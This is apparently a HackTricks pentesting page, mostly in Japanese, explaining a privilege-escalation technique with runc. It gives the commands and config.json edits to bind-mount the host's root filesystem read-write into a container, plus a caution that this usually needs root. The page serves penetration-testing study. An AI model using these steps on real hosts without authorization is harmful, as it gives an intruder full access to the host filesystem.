# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

**runc** について詳しく知りたい場合は、以下のページを確認してください。


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

ホストに `runc` がインストールされている場合、**ホストの root / フォルダを mount した container を実行できる**可能性があります。
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> これは常に機能するとは限りません。runc のデフォルトの動作は root として実行することなので、非特権ユーザーとして実行しても単純には機能しないためです（rootless configuration がある場合を除きます）。rootless configuration をデフォルトにするのは、一般的には良い考えではありません。rootless containers 内には、rootless containers の外部には適用されない制限がかなりあるためです。

{{#include ../../banners/hacktricks-training.md}}
